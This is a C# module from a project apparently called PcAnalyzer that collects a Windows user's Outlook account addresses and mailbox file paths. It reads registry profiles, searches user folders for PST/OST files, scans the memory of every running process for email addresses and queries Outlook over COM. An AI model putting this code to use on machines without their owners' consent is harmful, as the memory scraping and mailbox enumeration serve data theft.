using Microsoft.Win32;
using PcAnalyzer.Interfaces;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Text;
using System.Text.RegularExpressions;
using Binarysharp.MemoryManagement;
using OutlookApp = Microsoft.Office.Interop.Outlook.Application;
using OutlookException = Microsoft.Office.Interop.Outlook.Exception;

namespace PcAnalyzer.Models
{
    public class OutlookProgram : IExportable
    {
        private bool _isChecked;
        public bool IsChecked
        {
            get => _isChecked;
            set
            {
                if (_isChecked != value)
                {
                    _isChecked = value;
                    OnPropertyChanged(nameof(IsChecked));
                }
            }
        }
        public event PropertyChangedEventHandler PropertyChanged;
        protected void OnPropertyChanged(string propertyName) =>
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
        public string Version { get; set; }
        public string Login { get; set; }
        public string Address { get; set; }
        public string Password { get; set; }
        public List<string> osts { get; set; }
        public List<string> psts { get; set; }

        public string FormatData()
        {
            return GetProfilesLogin();
        }
        public string GetName()
        {
            return "Outlook";
        }
        const bool EnableErrorLogging = false;

        // Метод для получения информации о профилях Outlook и связанных файлов данных
        static string GetProfilesLogin()
        {
            StringBuilder result = new StringBuilder();

            // Основные пути для поиска, включая Office 365
            string[] basePaths = {
            @"Software\Microsoft\Office",              // Основной путь для 64-битных приложений
            @"Software\WOW6432Node\Microsoft\Office",  // Путь для 32-битных приложений на 64-битной системе
            @"Software\Microsoft\Office\Office365",    // Путь для Office 365 (если присутствует)
            @"Software\WOW6432Node\Microsoft\Office\Office365" // Путь для Office 365 на 32-битных приложениях
        };

            // Список аккаунтов, найденных в реестре
            List<string> registryAccounts = new List<string>();

            foreach (string basePath in basePaths)
            {
                try
                {
                    ScanRegistry(Registry.CurrentUser, basePath, result, registryAccounts);
                }
                catch (System.Exception ex)
                {
                }
            }

            // Сканируем файловую систему. Соберём PST и OST файлы
            HashSet<string> foundDataFiles = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            ScanFileSystemForDataFiles(result, foundDataFiles);

            // Попытаемся определить аккаунты из файлов, если они не были найдены в реестре
            HashSet<string> fileAccounts = ExtractAccountsFromFiles(foundDataFiles);
            foreach (var acc in fileAccounts)
            {
                if (!registryAccounts.Contains(acc, StringComparer.OrdinalIgnoreCase))
                {
                    registryAccounts.Add(acc);
                }
            }

            // Если аккаунты не найдены, пытаемся искать в оперативной памяти
            if (registryAccounts.Count == 0)
            {
                HashSet<string> memoryAccounts = ScanMemoryForAccounts();
                foreach (var acc in memoryAccounts)
                {
                    if (!registryAccounts.Contains(acc, StringComparer.OrdinalIgnoreCase))
                    {
                        registryAccounts.Add(acc);
                    }
                }
            }

            // Если аккаунты всё ещё не найдены, пробуем через Outlook COM API
            if (registryAccounts.Count == 0)
            {
                HashSet<string> outlookAccounts = GetOutlookAccounts();
                foreach (var acc in outlookAccounts)
                {
                    if (!registryAccounts.Contains(acc, StringComparer.OrdinalIgnoreCase))
                    {
                        registryAccounts.Add(acc);
                    }
                }
            }

            // Выводим все найденные аккаунты
            if (registryAccounts.Count > 0)
            {
                result.AppendLine("Найденные аккаунты:");
                foreach (var acc in registryAccounts)
                {
                    result.AppendLine(acc);
                }
            }
            else
            {
                result.AppendLine("Аккаунты не найдены.");
            }

            return result.ToString();
        }

        static HashSet<string> GetOutlookAccounts()
        {
            var accounts = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            try
            {
                OutlookApp outlookApp = new OutlookApp();
                var outlookNamespace = outlookApp.GetNamespace("MAPI");

                foreach (Microsoft.Office.Interop.Outlook.Account account in outlookNamespace.Accounts)
                {
                    if (!string.IsNullOrEmpty(account.SmtpAddress) && IsValidEmail(account.SmtpAddress))
                    {
                        accounts.Add(account.SmtpAddress);
                    }
                }
            }
            catch (System.Exception ex)
            {
                Console.WriteLine("Ошибка при доступе к Outlook: " + ex.Message);
            }

            return accounts;
        }

        // Метод для сканирования реестра по заданному базовому пути
        static void ScanRegistry(RegistryKey rootKey, string basePath, StringBuilder result, List<string> registryAccounts)
        {
            using (RegistryKey officeKey = rootKey.OpenSubKey(basePath))
            {
                if (officeKey == null)
                {
                    return;
                }

                foreach (string version in officeKey.GetSubKeyNames())
                {
                    using (RegistryKey versionKey = officeKey.OpenSubKey(version))
                    {
                        if (versionKey == null)
                            continue;

                        using (RegistryKey outlookKey = versionKey.OpenSubKey("Outlook\\Profiles"))
                        {
                            if (outlookKey == null)
                                continue;

                            foreach (string profileName in outlookKey.GetSubKeyNames())
                            {
                                using (RegistryKey profileKey = outlookKey.OpenSubKey(profileName))
                                {
                                    if (profileKey != null)
                                    {
                                        result.AppendLine($"Профиль Outlook: {profileName}");
                                        List<string> accounts = new List<string>();
                                        List<string> allDataFiles = new List<string>();

                                        // Сканируем профиль для получения аккаунтов и файлов данных
                                        ScanProfile(profileKey, accounts, allDataFiles);

                                        // Добавляем аккаунты в общий список, если их там нет
                                        foreach (var acc in accounts)
                                        {
                                            if (!registryAccounts.Contains(acc, StringComparer.OrdinalIgnoreCase))
                                            {
                                                registryAccounts.Add(acc);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        static void ScanProfile(RegistryKey profileKey, List<string> accounts, List<string> dataFiles)
        {
            foreach (string subkeyName in profileKey.GetSubKeyNames())
            {
                using (RegistryKey subkey = profileKey.OpenSubKey(subkeyName))
                {
                    if (subkey == null)
                        continue;

                    foreach (string valueName in subkey.GetValueNames())
                    {
                        object value = subkey.GetValue(valueName);

                        // Ищем имена аккаунтов
                        if (valueName.Contains("Account Name", StringComparison.OrdinalIgnoreCase))
                        {
                            string potentialEmail = value as string;
                            if (!string.IsNullOrEmpty(potentialEmail) && IsValidEmail(potentialEmail))
                            {
                                if (!accounts.Contains(potentialEmail, StringComparer.OrdinalIgnoreCase))
                                {
                                    accounts.Add(potentialEmail);
                                }
                            }
                        }

                        // Ищем пути к файлам OST и PST
                        if (value is string stringValue)
                        {
                            if (stringValue.EndsWith(".ost", StringComparison.OrdinalIgnoreCase) ||
                                stringValue.EndsWith(".pst", StringComparison.OrdinalIgnoreCase))
                            {
                                if (!dataFiles.Contains(stringValue, StringComparer.OrdinalIgnoreCase))
                                {
                                    dataFiles.Add(stringValue);
                                }
                            }
                        }
                    }

                    ScanProfile(subkey, accounts, dataFiles);
                }
            }
        }

        static bool IsValidEmail(string email)
        {
            try
            {
                var addr = new MailAddress(email);
                return addr.Address == email;
            }
            catch
            {
                return false;
            }
        }

        static HashSet<string> ExtractAccountsFromFiles(HashSet<string> dataFiles)
        {
            var accounts = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            foreach (var dataFile in dataFiles)
            {
                var fileName = Path.GetFileNameWithoutExtension(dataFile);
                if (fileName.Contains("@") && IsValidEmail(fileName))
                {
                    accounts.Add(fileName);
                }
            }

            return accounts;
        }

        static void ScanFileSystemForDataFiles(StringBuilder result, HashSet<string> foundDataFiles)
        {
            List<string> directoriesToScan = new List<string>();

            string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!string.IsNullOrEmpty(documentsPath))
            {
                directoriesToScan.Add(Path.Combine(documentsPath, "Outlook Files"));
            }

            string appDataLocal = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            if (!string.IsNullOrEmpty(appDataLocal))
            {
                directoriesToScan.Add(Path.Combine(appDataLocal, "Microsoft\\Outlook"));
            }

            foreach (string dir in directoriesToScan)
            {
                if (Directory.Exists(dir))
                {
                    try
                    {
                        foreach (string file in Directory.EnumerateFiles(dir, "*.pst", SearchOption.AllDirectories).Concat(Directory.EnumerateFiles(dir, "*.ost", SearchOption.AllDirectories)))
                        {
                            if (!foundDataFiles.Contains(file))
                            {
                                foundDataFiles.Add(file);
                                result.AppendLine($"{file}");
                            }
                        }
                    }
                    catch (System.Exception ex)
                    {
                    }
                }
            }
        }

        static HashSet<string> ScanMemoryForAccounts()
        {
            var memoryAccounts = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    using (var memory = new MemorySharp(process))
                    {
                        foreach (var module in memory.Modules.RemoteModules)
                        {
                            try
                            {
                                var bytes = memory.Read<byte>(module.BaseAddress, module.Size);
                                var content = Encoding.ASCII.GetString(bytes);

                                string keyPattern = @"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}";
                                var matches = Regex.Matches(content, keyPattern);

                                foreach (Match match in matches)
                                {
                                    if (IsValidEmail(match.Value))
                                    {
                                        memoryAccounts.Add(match.Value);
                                    }
                                }
                            }
                            catch
                            {
                            }
                        }
                    }
                }
                catch
                {
                }
            }

            return memoryAccounts;
        }
    }
}
